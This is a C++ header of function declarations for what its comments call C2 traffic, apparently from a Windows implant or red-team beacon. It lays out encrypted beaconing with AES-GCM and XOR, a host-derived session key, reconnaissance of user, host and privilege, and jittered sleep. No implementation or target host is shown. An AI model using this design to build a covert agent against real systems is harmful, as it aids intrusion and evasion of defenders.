#pragma once
#include <windows.h>
#include <string>
#include <vector>

// ---------------------------------------------------------------------------
// String conversion
// ---------------------------------------------------------------------------
std::string  WStringToUTF8(const std::wstring& wstr);
std::wstring UTF8ToWString(const std::string& utf8);

// ---------------------------------------------------------------------------
// Encoding
// ---------------------------------------------------------------------------
std::string        Base64Encode(const BYTE* data, size_t len);
std::vector<BYTE>  Base64Decode(const std::string& b64);

// ---------------------------------------------------------------------------
// XOR cipher — in-place, repeating key
// ---------------------------------------------------------------------------
VOID XorBuffer(BYTE* data, size_t len, const BYTE* key, size_t keyLen);

// ---------------------------------------------------------------------------
// AES-256-GCM (BCrypt) — double-encrypts C2 traffic
//   Wire format: Base64( nonce[12] || tag[16] || ciphertext )
// ---------------------------------------------------------------------------
std::string AesGcmEncrypt(const std::vector<BYTE>& key32,
                          const std::string& plaintext);

std::string AesGcmDecrypt(const std::vector<BYTE>& key32,
                          const std::string& b64Wire);

// ---------------------------------------------------------------------------
// Hardware-derived 32-byte session key
//   SHA-256( VolumeSerial(C:\) || CPUID(leaf1) || ComputerName )
//   Unique per host, reproducible — server derives same key from session ID.
// ---------------------------------------------------------------------------
std::vector<BYTE> DeriveHardwareKey();

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------
std::wstring GetHostnameHash();   // FNV-1a 32-bit → 8-char hex wstring
std::wstring GetUsername();
std::wstring GetHostname();
DWORD        GetOSBuild();        // via RtlGetVersion (shim-immune)
BOOL         IsElevated();        // TokenElevation query

// ---------------------------------------------------------------------------
// Timing
// ---------------------------------------------------------------------------
VOID JitterSleep(DWORD minSec, DWORD maxSec);  // uniform distribution